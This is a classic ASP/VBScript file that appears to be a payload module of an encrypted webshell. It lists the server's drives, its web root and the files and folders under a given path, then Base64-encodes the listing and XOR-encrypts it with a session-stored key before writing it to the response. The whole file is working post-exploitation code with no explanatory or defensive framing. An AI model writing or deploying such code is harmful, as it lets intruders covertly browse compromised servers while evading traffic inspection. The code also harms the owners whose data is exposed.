Function Base64Encode(sText)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function GetStream()
	Set GetStream=CreateObject("Adodb.Stream")
End Function

Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+5,1)))
Next
Encrypt=encryptResult
End Function
Function getStr(file)
	size=file.size
	If Err Then
		size="PermissonDenied"
	Else
		lastModified=file.datelastmodified
	End If
	Err=0
	attr=file.attributes
	attrstr=""
	Select case attr
	case 0
		attrstr="N("&attr&")[R]"
	case 1
		attrstr="R("&attr&")[R]"
	case 2
		attrstr="H("&attr&")[R]"
	case 4
		attrstr="S("&attr&")[R]"
	case 16
		attrstr="Directory("&attr&")"
	case 32
		attrstr="A("&attr&")[RW]"
	case Else 
		attrstr="Other("&attr&")"
	end Select
	filename=file.name
	IF fso.folderexists(file.path)=True Then
		filename="dic:"&filename
	End IF
	getStr=filename&chr(9)&file.size&chr(9)&attrstr&chr(9)&lastModified&chr(10)
End Function
Dim fso
Function list(path)
on error resume next
Dim listResult
Dim fs,sa
Set fso=server.createobject("Scripting.FileSystemObject")
If IsEmpty(fso) Then
Set fso=server.createobject("shell.application")
End If

Set pathObj = fso.GetFolder(path)
Set fsofolders = pathObj.SubFolders
Set fsofile = pathObj.Files
For Each folder in fsofolders
	line=getStr(folder)
	listResult=listResult&line
Next

For Each file in fsofile
	line=getStr(file)
	listResult=listResult&line
Next 
list=listResult
Set fso=Nothing
End Function

Function driveList()
Dim TheDrive,Fso
		set Fso=GetFso()
		For Each TheDrive In Fso.Drives
			with TheDrive
			driveList=driveList&.DriveLetter&":/,"
			end with
			If Err Then Err.Clear
		Next
End Function

Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=server.CreateObject(Key)
	Set GetFso=Fso
End Function

Sub main(path)
	IF path="" or path="/" then
		path=Server.MapPath(".")
	End If
	data=driveList()&chr(13)&chr(10)&Server.MapPath(".")&chr(13)&chr(10)&list(path)
	Response.binarywrite(Encrypt(Base64Encode(data)))
End Sub